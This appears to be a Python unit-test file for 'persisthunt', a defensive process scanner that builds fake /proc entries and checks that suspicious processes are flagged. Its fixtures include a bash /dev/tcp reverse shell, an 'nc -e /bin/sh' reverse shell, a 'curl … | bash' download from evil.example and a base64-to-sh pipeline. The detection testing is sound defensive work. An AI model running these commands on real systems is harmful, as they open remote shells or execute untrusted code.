import os
import tempfile
import unittest
from pathlib import Path
from persisthunt.findings import Finding, FindingCollection, Severity
from persisthunt.detectors.process import ProcessDetector

class TestProcessDetector(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.test_dir.name)
        self.proc_dir = self.root / "proc"
        self.proc_dir.mkdir(parents=True)

    def tearDown(self):
        self.test_dir.cleanup()

    def _create_proc_entry(
        self,
        pid: int,
        comm: str,
        ppid: int = 1,
        uid: int = 1000,
        cmdline_args: list = None,
        exe_target: str = None,
    ) -> Path:
        pid_dir = self.proc_dir / str(pid)
        pid_dir.mkdir(parents=True, exist_ok=True)

        # status
        status_content = (
            f"Name:\t{comm}\n"
            f"State:\tS (sleeping)\n"
            f"Tgid:\t{pid}\n"
            f"Pid:\t{pid}\n"
            f"PPid:\t{ppid}\n"
            f"Uid:\t{uid}\t{uid}\t{uid}\t{uid}\n"
        )
        (pid_dir / "status").write_text(status_content)

        # cmdline
        if cmdline_args is not None:
            raw = b"\x00".join(arg.encode() for arg in cmdline_args) + b"\x00"
            (pid_dir / "cmdline").write_bytes(raw)
        else:
            (pid_dir / "cmdline").write_bytes(b"")

        # exe symlink
        if exe_target is not None:
            exe_link = pid_dir / "exe"
            if exe_link.exists() or exe_link.is_symlink():
                exe_link.unlink()
            os.symlink(exe_target, exe_link)

        return pid_dir

    def test_empty_proc_returns_empty_collection(self):
        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()
        self.assertEqual(findings.count(), 0)

    def test_normal_process_produces_zero_findings(self):
        self._create_proc_entry(
            pid=1,
            comm="systemd",
            ppid=0,
            uid=0,
            cmdline_args=["/usr/lib/systemd/systemd", "--system"],
            exe_target="/usr/lib/systemd/systemd",
        )
        self._create_proc_entry(
            pid=100,
            comm="python3",
            ppid=1,
            uid=1000,
            cmdline_args=["/usr/bin/python3", "/home/alice/app.py"],
            exe_target="/usr/bin/python3",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()
        self.assertEqual(findings.count(), 0)

    def test_process_executing_from_tmp_directory(self):
        self._create_proc_entry(
            pid=200,
            comm="backdoor",
            ppid=1,
            uid=1000,
            cmdline_args=["/tmp/backdoor"],
            exe_target="/tmp/backdoor",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        self.assertGreaterEqual(findings.count(), 1)
        tmp_findings = [f for f in findings if f.id == "PH-PROC-001"]
        self.assertEqual(len(tmp_findings), 1)
        self.assertEqual(tmp_findings[0].severity, Severity.HIGH)
        self.assertIn("/tmp/backdoor", tmp_findings[0].evidence)

    def test_process_cmdline_in_var_tmp(self):
        self._create_proc_entry(
            pid=201,
            comm="sh",
            ppid=1,
            uid=1000,
            cmdline_args=["/bin/sh", "/var/tmp/miner.sh"],
            exe_target="/bin/sh",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        tmp_findings = [f for f in findings if f.id == "PH-PROC-001"]
        self.assertEqual(len(tmp_findings), 1)
        self.assertEqual(tmp_findings[0].severity, Severity.HIGH)

    def test_process_executing_from_hidden_directory(self):
        self._create_proc_entry(
            pid=300,
            comm="agent",
            ppid=1,
            uid=1000,
            cmdline_args=["/home/victim/.hidden_bin/agent"],
            exe_target="/home/victim/.hidden_bin/agent",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        hidden_findings = [f for f in findings if f.id == "PH-PROC-002"]
        self.assertEqual(len(hidden_findings), 1)
        self.assertEqual(hidden_findings[0].severity, Severity.HIGH)

    def test_deleted_binary_execution(self):
        self._create_proc_entry(
            pid=400,
            comm="stealth_bot",
            ppid=1,
            uid=1000,
            cmdline_args=["/opt/stealth_bot"],
            exe_target="/opt/stealth_bot (deleted)",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        del_findings = [f for f in findings if f.id == "PH-PROC-003"]
        self.assertEqual(len(del_findings), 1)
        self.assertEqual(del_findings[0].severity, Severity.HIGH)
        self.assertIn("(deleted)", del_findings[0].evidence)

    def test_reverse_shell_socket_redirection(self):
        self._create_proc_entry(
            pid=500,
            comm="bash",
            ppid=1,
            uid=1000,
            cmdline_args=["/bin/bash", "-i", ">&", "/dev/tcp/198.51.100.1/4444", "0>&1"],
            exe_target="/bin/bash",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        socket_findings = [f for f in findings if f.id == "PH-PROC-004"]
        self.assertEqual(len(socket_findings), 1)
        self.assertEqual(socket_findings[0].severity, Severity.HIGH)

    def test_interactive_netcat_reverse_shell(self):
        self._create_proc_entry(
            pid=501,
            comm="nc",
            ppid=1,
            uid=1000,
            cmdline_args=["nc", "-e", "/bin/sh", "203.0.113.5", "1337"],
            exe_target="/bin/nc",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        netcat_findings = [f for f in findings if f.id == "PH-PROC-004"]
        self.assertEqual(len(netcat_findings), 1)

    def test_piped_download_execution(self):
        self._create_proc_entry(
            pid=502,
            comm="sh",
            ppid=1,
            uid=1000,
            cmdline_args=["/bin/sh", "-c", "curl -fsSL https://evil.example/a.sh | bash"],
            exe_target="/bin/sh",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        download_findings = [f for f in findings if f.id == "PH-PROC-004"]
        self.assertEqual(len(download_findings), 1)

    def test_encoded_payload_execution(self):
        self._create_proc_entry(
            pid=503,
            comm="bash",
            ppid=1,
            uid=1000,
            cmdline_args=["/bin/bash", "-c", "echo aGVsbG8= | base64 -d | sh"],
            exe_target="/bin/bash",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        b64_findings = [f for f in findings if f.id == "PH-PROC-004"]
        self.assertEqual(len(b64_findings), 1)

    def test_web_server_spawning_interactive_shell(self):
        # Parent: nginx worker process
        self._create_proc_entry(
            pid=600,
            comm="nginx",
            ppid=1,
            uid=33,
            cmdline_args=["nginx: worker process"],
            exe_target="/usr/sbin/nginx",
        )
        # Child: spawned bash shell
        self._create_proc_entry(
            pid=601,
            comm="sh",
            ppid=600,
            uid=33,
            cmdline_args=["/bin/sh"],
            exe_target="/bin/sh",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        rce_findings = [f for f in findings if f.id == "PH-PROC-005"]
        self.assertEqual(len(rce_findings), 1)
        self.assertEqual(rce_findings[0].severity, Severity.HIGH)
        self.assertIn("nginx", rce_findings[0].evidence)

    def test_inline_interpreter_execution(self):
        self._create_proc_entry(
            pid=700,
            comm="python3",
            ppid=1,
            uid=1000,
            cmdline_args=["python3", "-c", "import os; print('hello')"],
            exe_target="/usr/bin/python3",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        inline_findings = [f for f in findings if f.id == "PH-PROC-006"]
        self.assertEqual(len(inline_findings), 1)
        self.assertEqual(inline_findings[0].severity, Severity.MEDIUM)

    def test_credential_sanitization_privacy(self):
        self._create_proc_entry(
            pid=800,
            comm="service",
            ppid=1,
            uid=1000,
            cmdline_args=["/tmp/tool", "--password", "SuperSecretPassword123!", "--token=xyz98765"],
            exe_target="/tmp/tool",
        )

        detector = ProcessDetector(proc_dir=self.proc_dir)
        findings = detector.scan()

        for f in findings:
            self.assertNotIn("SuperSecretPassword123!", str(f.evidence))
            self.assertNotIn("xyz98765", str(f.evidence))
            self.assertIn("***REDACTED***", str(f.evidence))

    def test_missing_proc_dir_handling(self):
        non_existent = self.root / "non_existent_proc"
        detector = ProcessDetector(proc_dir=non_existent)
        findings = detector.scan()

        self.assertEqual(findings.count(), 1)
        finding = list(findings)[0]
        self.assertEqual(finding.id, "PH-PROC-090")
        self.assertEqual(finding.severity, Severity.INFO)

    def test_read_only_safety_preserves_proc_files(self):
        pid_dir = self._create_proc_entry(
            pid=900,
            comm="safe_proc",
            ppid=1,
            uid=1000,
            cmdline_args=["/usr/bin/safe_proc"],
            exe_target="/usr/bin/safe_proc",
        )

        status_content_before = (pid_dir / "status").read_text()
        detector = ProcessDetector(proc_dir=self.proc_dir)
        detector.scan()

        self.assertEqual((pid_dir / "status").read_text(), status_content_before)

    def test_real_system_proc_scan_does_not_crash(self):
        detector = ProcessDetector()
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        for f in findings:
            self.assertIsInstance(f, Finding)
            self.assertEqual(f.category, "process")
            self.assertTrue(f.id.startswith("PH-PROC-"))

if __name__ == "__main__":
    unittest.main()
